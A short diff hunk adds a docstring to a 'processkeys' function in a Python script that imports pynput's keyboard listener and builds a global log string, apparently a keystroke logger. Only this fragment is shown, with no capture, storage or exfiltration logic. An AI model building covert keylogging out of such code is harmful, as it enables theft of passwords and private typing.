@@ -3,6 +3,10 @@ from pynput import keyboard
 log = ''
 
 def processkeys(key):
+        """
+        Main function
+        :param key: represents a pressed key
+        """
         global log
 
         try:
